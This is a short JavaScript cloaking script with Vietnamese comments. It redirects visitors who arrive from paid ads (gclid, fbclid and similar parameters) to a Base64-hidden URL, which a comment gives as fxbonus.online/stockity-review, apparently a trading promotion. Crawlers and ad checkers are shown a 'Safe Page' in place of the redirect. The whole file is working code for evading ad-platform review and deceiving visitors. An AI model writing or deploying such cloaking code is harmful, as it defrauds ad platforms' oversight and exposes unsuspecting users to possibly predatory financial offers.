(function() {
    'use strict';
    
    // ĐÃ SỬA: Link chính xác https://fxbonus.online/stockity-review (Base64)
    const _target = "aHR0cHM6Ly9meGJvbnVzLm9ubGluZS9zdG9ja2l0eS1yZXZpZXc="; 
    
    const urlParams = new URLSearchParams(window.location.search);
    const adParams = ['gclid', 'wbraid', 'gbraid', 'gad_source', 'fbclid', 'msclkid'];
    const hasAdParam = adParams.some(param => urlParams.has(param));
    const isBot = /bot|google|crawler|spider|slurp|bing|facebook|adchecker|checker/i.test(navigator.userAgent);

    if (!isBot && hasAdParam) {
        // Thực hiện chuyển hướng sau 1.5 giây để khớp với màn hình chờ
        setTimeout(() => {
            window.location.replace(atob(_target));
        }, 1500);
    } else {
        // Nếu là BOT: Xóa bỏ trạng thái ẩn trang và hiện Safe Page
        document.documentElement.classList.remove('is-redirecting');
        document.body.style.opacity = "1";
    }
})();
